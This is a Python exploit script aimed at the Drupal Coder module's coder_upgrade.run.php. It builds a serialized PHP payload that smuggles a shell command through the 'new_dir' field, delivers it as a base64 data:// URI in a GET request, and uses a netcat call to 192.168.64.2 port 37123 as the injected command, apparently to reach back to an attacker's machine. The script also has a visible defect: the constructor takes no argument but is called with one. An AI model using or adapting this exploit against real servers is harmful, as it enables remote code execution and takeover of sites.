from base64 import b64encode
import requests
import sys


class DrupalCoderExec:

    WEBSERVER_PATH = '/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php'
    beachhead = ''

    def __init__(self):
        pass

    def set_beachhead(self, beachhead: str):
        self.beachhead = beachhead

    def create_payload(self, payload: str) -> str:
        p = ''
        p += 'a:6:{s:5:"paths";a:3:{s:12:"modules_base";s:8:"../../..";'
        p += 's:10:"files_base";s:5:"../..";s:14:"libraries_base";s:5:"../..";}'
        p += 's:11:"theme_cache";s:16:"theme_cache_test";'
        p += 's:9:"variables";s:14:"variables_test";'
        p += 's:8:"upgrades";a:1:{i:0;a:2:{s:4:"path";s:2:"..";s:6:"module";s:3:"foo";}}'
        p += 's:10:"extensions";a:1:{s:3:"php";s:3:"php";}'
        p += 's:5:"items";a:1:{i:0;a:3:{s:7:"old_dir";s:12:"../../images";'
        p += 's:7:"new_dir";s:'
        p += str(len(payload) + 5)
        p += ':"-v;'
        p += payload
        p += ' #";s:4:"name";s:4:"test";}}}'

        pl = "data://text/plain;base64," + b64encode(bytes(p, 'utf-8')).decode('utf-8')
        
        return pl

    def exploit(self, ip_addr: str, port: str, path: str) -> requests.models.Response:
        url = "http://" + ip_addr + ":" + port + path + self.WEBSERVER_PATH
        print(url)
        params = { 'file': self.create_payload(self.beachhead) }
        return requests.get(url=url, params=params)

        

if __name__ == "__main__":
    coder_exec = DrupalCoderExec('nc 192.168.64.2 37123')
    coder_exec.exploit(sys.argv[1], sys.argv[2], sys.argv[3])